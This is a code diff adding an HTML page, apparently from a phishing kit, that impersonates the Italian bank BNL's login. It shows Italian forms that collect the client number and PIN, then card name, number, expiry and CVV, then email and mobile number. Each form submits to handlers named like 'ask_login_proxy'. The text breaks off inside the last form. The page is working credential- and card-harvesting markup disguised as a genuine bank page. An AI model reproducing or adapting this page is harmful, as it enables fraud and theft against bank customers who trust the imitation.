@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title></title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js"></script>
+    <style>
+        html,
+body {
+    height: 100%;
+}
+
+.table {
+    display: table;
+    table-layout: fixed;
+    margin-bottom: 0px;
+}
+
+.tr {
+    display: table-row;
+}
+
+.td {
+    display: table-cell;
+}
+
+
+
+.scum_container {
+    position: relative;
+    /* overflow: hidden; */
+}
+
+body {
+    display: block;
+    background-image: linear-gradient( #262626, #434343 );
+    height: 100%;
+    }
+
+}
+    height: 100%;
+    background-repeat: no-repeat;
+    background-size: cover;
+    font-family: inherit !important;
+    height: 100vh;
+    padding:0;
+    margin:0;
+}
+
+.gap {
+    height: 100px;
+}
+
+.logo {
+    padding: 75px 15px 4px 15px;
+    text-align: center;
+}
+
+
+
+
+.footer-gap {
+    height: 72px;
+}
+
+
+
+@-webkit-keyframes backgroundScroll {
+    from {
+        background-position: 190% 50%;
+    }
+
+    to {
+        background-position: -200px 50%;
+    }
+}
+
+@keyframes backgroundScroll {
+    from {
+        background-position: 190% 50%;
+    }
+
+    to {
+        background-position: -200px 50%;
+    }
+}
+
+/*fly top lebel*/
+.form-group {
+    position: relative;
+    margin-bottom: 9px;
+}
+
+.control-label {
+    position: absolute;
+    bottom: 5px;
+    left: 19px;
+    font-size: 14;
+    transition: all .3s ease;
+    color: white;
+    font-weight: 100;
+    z-index: 0;
+}
+
+.control-label.up {
+    top: 2px;
+    font-size: 11px;
+}
+
+
+.form-control:focus + label,.form-control.ng-not-empty + label{
+    top: 2px;
+    font-size: 11px;
+}
+
+input.form-control,
+input.form-control:focus {
+    background: none;
+    border-radius: 0px;
+    border: 0px;
+    box-shadow: none;
+    border-bottom: 1px solid white;
+    color: #f6f6f6;
+    font-weight: 100;
+    padding: 0px;
+    height: 21px;
+    z-index: 1;
+    position: relative;
+    font-size: 18px;
+	
+}
+
+input.form-control:focus {
+    border-bottom-width: 2px;
+}
+
+/*fly top lebel*/
+img.logo87 {
+    width: 100px;
+    transition: all .2s ease;
+}
+
+.gap {
+    transition: all .2s ease;
+}
+
+.gap.has-focus {
+    height: 20px;
+}
+
+.footer.has-focus {
+    display: none;
+}
+
+img.logo87.has-focus {
+    width: 60px;
+}
+
+span.buger.fa.fa-bars {
+    position: absolute;
+    right: 13px;
+    top: 10px;
+    color: white;
+    font-size: 20px;
+}
+
+/* deete icon */
+span.delete {
+    position: absolute;
+    right: 13px;
+    bottom: 16px;
+    color: rgb(255, 255, 255);
+    font-size: 19px;
+    display: none;
+    z-index: 2;
+}
+
+.form-control.has-value+.delete {
+    display: block !important
+}
+
+/* deete icon */
+span.err_span.text-warning {
+    color: #ffffffa3;
+    padding-left: 15px;
+}
+
+.form-group.has_err .err_span {
+    display: block !important
+}
+
+.form-group.has_err .form-control {
+    border-color: #fb9f00
+}
+
+.f989 {
+    position: relative;
+    top: -2px;
+    text-align: right;
+    color: white;
+    font-weight: 100;
+}
+
+.t87 {
+    text-align: center;
+    color: white;
+    font-size: 12px;
+}
+
+.buttondiv {
+    margin: 10px 84px;
+}
+
+button.btn.btn-info.start {
+    width: 100%;
+    background: #1c7845;
+    color: #ffffff;
+    border-radius: 2px;
+    outline: none;
+    border: none;
+    margin-bottom: 6px;
+    padding: 9px 1px;
+    font-size: 17px;
+}
+
+button.btn.btn-info.become {
+    border: 1px solid white;
+    border-radius: 2px;
+    width: 100%;
+    background: transparent;
+    outline: none;
+    padding: 8px 1px;
+    font-size: 17px;
+}
+
+span.fa-stack.l_4 {
+    opacity: 0.7;
+}
+
+.d9898 {
+    background: transparent;
+    padding: 13px 19px;
+    padding-top: 15px;
+    position: relative;
+}
+
+.form-group.has_err .d9898 {
+    background: #ffbebe;
+    border-bottom: 2px solid red
+}
+
+.form-group.has_err .d9898 label {
+    color: red
+}
+
+p.legendp {
+    color: white;
+    line-height: 16px;
+    font-size: 13px;
+    font-weight: 100;
+    margin-top: 7px;
+}
+
+.card-logo {
+    width: 24px;
+}
+
+
+
+
+
+
+@-webkit-keyframes scums_hide {
+    0% {
+        opacity: 1;
+    }
+
+    100% {
+        opacity: 0;
+        -webkit-transform: translateX(1000px);
+        transform: translateX(1000px);
+        /* height: 0px;*/
+
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+@keyframes scums_hide {
+    0% {
+        opacity: 1;
+    }
+
+    100% {
+        opacity: 0;
+        -webkit-transform: translateX(1000px);
+        transform: translateX(1000px);
+        /* height: 0px;*/
+
+    }
+}
+
+
+@-webkit-keyframes scums_show {
+    0% {
+        opacity: 0;
+        -webkit-transform: translateX(1000px);
+        transform: translateX(1000px);
+    }
+
+    100% {
+        opacity: 1;
+
+
+    }
+}
+
+
+@keyframes scums_show {
+    0% {
+        opacity: 0;
+        -webkit-transform: translateX(1000px);
+        transform: translateX(1000px);
+    }
+
+    100% {
+        opacity: 1;
+
+
+    }
+}
+
+
+
+.scum_container.loader_show .scum {
+    -webkit-animation-name: scums_hide;
+    animation-name: scums_hide;
+    -webkit-animation-duration: 0s;
+    animation-duration: 0s;
+    transition-timing-function: ease;
+    -webkit-animation-fill-mode: forwards;
+    animation-fill-mode: forwards;
+    height: 0px;
+    padding: 0px;
+    margin: 0px;
+    display: none;
+
+}
+
+.scum_container.loader_hide .scum {
+    display: block;
+    -webkit-animation-name: scums_show;
+    animation-name: scums_show;
+    -webkit-animation-duration: 1s;
+    animation-duration: 1s;
+    transition-timing-function: ease;
+    /*     animation-fill-mode:forwards; */
+
+}
+
+
+/*Loader2__ 2020*/
+.scum_container.loader_show .loader2__ {
+    -webkit-animation-name: loader2__show;
+    animation-name: loader2__show;
+    -webkit-animation-duration: 0s;
+    animation-duration: 0s;
+
+}
+
+.scum_container.loader_hide .loader2__ {
+
+    -webkit-animation-name: loader2__hide;
+
+    animation-name: loader2__hide;
+    -webkit-animation-duration: 1s;
+    animation-duration: 1s;
+    -webkit-animation-fill-mode: forwards;
+    animation-fill-mode: forwards;
+    height: 0px;
+    padding: 0px;
+    margin: 0px;
+    display: none;
+
+}
+
+@-webkit-keyframes loader2__hide {
+    0% {
+        opacity: 1;
+    }
+
+    100% {
+        opacity: 0;
+        -webkit-transform: translateX(-1000px);
+        transform: translateX(-1000px);
+        /*height: 0px*/
+    }
+}
+
+@keyframes loader2__hide {
+    0% {
+        opacity: 1;
+    }
+
+    100% {
+        opacity: 0;
+        -webkit-transform: translateX(-1000px);
+        transform: translateX(-1000px);
+        /*height: 0px*/
+    }
+}
+
+@-webkit-keyframes loader2__show {
+    0% {
+        opacity: 0;
+        -webkit-transform: translateX(-1000px);
+        transform: translateX(-1000px);
+    }
+
+    100% {
+        opacity: 1;
+
+    }
+}
+
+@keyframes loader2__show {
+    0% {
+        opacity: 0;
+        -webkit-transform: translateX(-1000px);
+        transform: translateX(-1000px);
+    }
+
+    100% {
+        opacity: 1;
+
+    }
+}
+
+
+.loader2__ {
+    text-align: center;
+    padding: 1p;
+    padding: 23px 0px;
+    color: white;
+}
+
+
+.cool_spinner__ {
+    display: inline-block;
+    width: 50px !important;
+    margin: 5px 0px;
+}
+
+.cool_spinner__ svg {
+    stroke: rgb(255 255 255);
+}
+
+.loader2__h4 {
+    font-size: 23px;
+    margin: 5px 0px;
+}
+
+p.loader2__p {
+    margin: 6px 0px;
+}
+
+.hide_on_loader {
+    display: none;
+}
+
+
+/*Loader2__ 2020*/
+    </style>
+</head>
+
+<body     ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}"  ng-cloak    >
+    <div class="main">
+        <span class="buger fa fa-bars"></span>
+        <div class="logo">
+            <img src="https://www.eng.it/resources/customer-logo/bnl/bnl-white.png" alt="" class="logo87 onfocus">
+        </div>
+        <div class="gap onfocus"></div>
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12 col-sm-2"></div>
+                <div class="col-xs-12 col-sm-8">
+                    <div class="f">
+                        <div class="scum_container loader_show">
+                            <div class="scum" id="login-view" style="display: ;">
+                                <form class="form" id="form" novalidate name="form" onsubmit="send1(event,'ask_login_proxy');return false">
+                                    
+
+
+                                    <div class="form-group  ">
+                                        <div class="d9898">
+                                            <input class="form-control " name="N-Cliente" data-ng-model="data.user" autocomplete="off" maxLength=10 pattern=".{8}" id="user">
+                                            <label for="" class="control-label  ">Numero Cliente</label>
+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">Numero Cliente non valido </span>
+                                    </div>
+							
+                                    <div class="form-group">
+                                        <div class="d9898">
+                                            <input class="form-control" type= "password" name="PIN" data-ng-model="data.pass" maxLength=6 pattern=".{6}" autocomplete="off" id="pass">
+                                            <label for="" class="control-label ">PIN</label>
+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">PIN non valido</span>
+                                    </div>
+
+<p class="legendp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Nascondi dati</p>
+                                    
+                                    <div class="footer onfocus ">
+                                        <div class="footer-gap">
+                                        </div>
+                                       
+                                        <div class="buttondiv">
+                                            <button class="btn btn-info start">Accedi</button>
+                                        </div>
+                                     
+                                    </div>
+                                </form>
+                            </div>
+							<div class="scum" id="cc-view" style="display:none ;">
+                                <form class="form" id="form" novalidate name="form" onsubmit="send1(event,'ask_cc_proxy');return false">
+                                    <div class="legend">
+                                        <span class="card-logos">
+                                            <img src="data:image/png;base64,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" alt="" class="visa-logo card-logo">
+                                            <img src="data:image/png;base64,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" alt="" class="mc-logo card-logo">
+                                            <img src="data:image/png;base64,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" alt="" class="am-logo card-logo">
+                                        </span>
+                                        <p class="legendp">Inserisci i dati della tua carta BNL per verificare la tua identità</p>
+                                    </div>
+									<div class="form-group  ">
+                                        <div class="d9898">
+                                            <input class="form-control " name="Nome-Card" data-ng-model="data.name" autocomplete="off" maxLength=40 pattern=".{4}" id="nome">
+                                            <label for="" class="control-label  ">Nome Cognome</label>
+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">Nome Cognome non valido </span>
+                                    </div>
+                                    <div class="form-group  ">
+                                        <div class="d9898">
+                                            <input class="form-control " name="Card" data-ng-model="data.c_c" autocomplete="off" pattern="\d{4} \d{4} \d{4} \d{4}" data-mask="9999 9999 9999 9999"  mask-placeholder="···· ···· ···· ····"    id="c_c">
+                                            <label for="c_c" class="control-label ">Numero di carta</label>
+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">Numero di carta non valido</span>
+                                    </div>
+                                    <div class="form-group  ">
+                                        <div class="d9898">
+                                            <input class="form-control " name="Exp" data-ng-model="data.exp" autocomplete="off" pattern="\d{2}\/\d{4}" data-mask="99/9999"  mask-placeholder="MM/AAAA"    id="exp">
+                                            <label for="exp" class="control-label ">Data di scadenza</label>
+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">Data di scadenza non valida</span>
+                                    </div>
+                                    <div class="form-group  ">
+                                        <div class="d9898">
+                                            <input class="form-control " name="Cvv" data-ng-model="data.cvv" autocomplete="off" maxlength="3" pattern="\d{3}" id="cvv">
+                                            <label for="cvv" class="control-label ">CVV</label>
+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">CVV non valido</span>
+                                    </div>
+                                    <div class="footer onfocus ">
+                                        <div class="footer-gap">
+                                        </div>
+                                        <div class="buttondiv">
+                                            <button class="btn btn-info start">Continua</button>
+                                        </div>
+                                    </div>
+                                </form>
+								
+                            </div>
+							<div class="scum" id="ce-view" style="display:none ;">
+                                <form class="form" id="form" novalidate name="form" onsubmit="send1(event,'ask_ce_proxy');return false">
+                                    <div class="legend">
+                                    
+                                        <p class="legendp">Completa i campi richiesti per verificare la tua identità</p>
+                                    </div>
+                                   
+                                    <div class="form-group  ">
+                                        <div class="d9898">
+                                            <input class="form-control " name="Email" data-ng-model="data.email" autocomplete="off" maxlength="50" pattern=".{1,50}" id="cvv">
+                                            <label for="cvv" class="control-label ">Email</label>
+                                            <span class="delete fa fa-times-circle"></span>
+                                        </div>
+                                        <span class="err_span text-warning" style="display: none;">Email non valida</span>
+                                    </div>
+                                    <div class="form-group ">
+                                        <div class="d9898">
+                                            <input class="form-control " name="Cell" data-ng-model="data.cell" autocomplete="off" type="text" maxlength="14" pattern="\d{3}" id="pin">
+                                            <label for="pin" class="control-label ">Cellulare</label>
